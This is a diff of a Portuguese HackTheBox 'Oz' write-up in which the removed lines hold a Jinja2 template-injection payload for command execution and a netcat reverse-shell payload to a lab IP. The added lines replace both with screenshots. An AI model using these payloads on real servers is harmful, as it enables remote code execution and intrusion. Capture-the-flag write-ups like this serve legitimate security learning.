@@ -155,7 +155,7 @@ Como vimos na requisição acima, ao especificarmos o valor para o parâmetro **
 
 Utilizando o Payload All The Things como base, eu consegui achar um payload utilizando para **Jinja2** para execução de comandos. Aqui está:
 
-{{config.__class__.__init__.__globals__['os'].popen('ls -la').read()}}
+![image](https://user-images.githubusercontent.com/44043159/134156907-891da782-3e5c-4996-9a18-8fce36c82600.png)
 
 
 Criptografando-o em URL Encode e injetando no parâmetro vulnerável, recebemos a response com o output do comando! 🥳
@@ -166,12 +166,10 @@ Criptografando-o em URL Encode e injetando no parâmetro vulnerável, recebemos 
 
 Para pegarmos shell reversa no servidor, eu utilizei este payload que confere uma reverse shell com netcat e jinja2:
 
-{{config.__class__.__init__.__globals__['os'].popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.5 1234 >/tmp/f').read()}}
+![image](https://user-images.githubusercontent.com/44043159/134156959-72f2ed8c-8367-4993-9639-d83c80169476.png)
 
 
 ![Untitled](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/Untitled%2011.png)
-
-![mp4.gif](Oz%20-%20HackTheBox%20Writeup%2070ece9237c34438baab3b83f5dd3cffc/mp4.gif)
 
 ---
 
